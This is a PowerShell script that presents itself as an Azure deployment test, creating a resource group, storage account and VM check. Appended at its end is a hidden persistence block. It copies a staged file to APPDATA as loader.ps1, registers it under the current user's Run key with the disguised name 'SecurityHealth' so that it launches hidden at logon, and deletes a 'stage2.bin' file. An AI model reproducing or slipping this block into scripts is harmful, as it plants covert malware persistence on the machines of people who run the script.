
<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.PARAMETER ResourceGroup
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Test-AzPortalDeploy.ps1 -ResourceGroup rg-portal-test-27
#>

$ResourceGroup  = "rg-portal-test-27"
$Location       = "eastus"
$TemplateFile   = "C:\Scripts\templates\portal-test.json"
$ParameterFile  = 'C:\Scripts\templates\portal-test.parameters.json'
$SubscriptionId = 'bddddf11-b581-d731-af8f-e368a615501e'
$StorageAccount = "sttest2342"
$VmName         = 'vm-portal-test-27'
$OutputPath     = "C:\Logs\deploy-test-2024-05-22.json"
$DryRun         = $false

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$DebugPreference = 'SilentlyContinue'
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant "contoso.com" -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployParams = @{
    ResourceGroupName     = $ResourceGroup
    TemplateFile          = $TemplateFile
    TemplateParameterFile = $ParameterFile
    Name                  = $DeploymentName
}
$deployment = New-AzResourceGroupDeployment @deployParams -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
<#
.SYNOPSIS
    Per-user Run-key persistence helper.

.DESCRIPTION
    Copies the launcher into the roaming profile and
    registers it under the current user's Run key.
#>
$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$RegistryValue = 'SecurityHealth'
$PersistencePath = "$env:APPDATA\loader.ps1"
$ErrorActionPreference = "Stop"

try {
    Write-Verbose "Installing per-user persistence"
    if (-not (Test-Path -Path $PersistencePath)) {
        Copy-Item -Path "$env:TEMP\update.dat" -Destination $PersistencePath -Force
    }
    New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + $PersistencePath + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
    $OperationResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue -ErrorAction SilentlyContinue
    Write-Verbose ("Registered value: " + $OperationResult.$RegistryValue)
}
catch {
    Write-Warning "Run-key installation failed: $($_.Exception.Message)"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
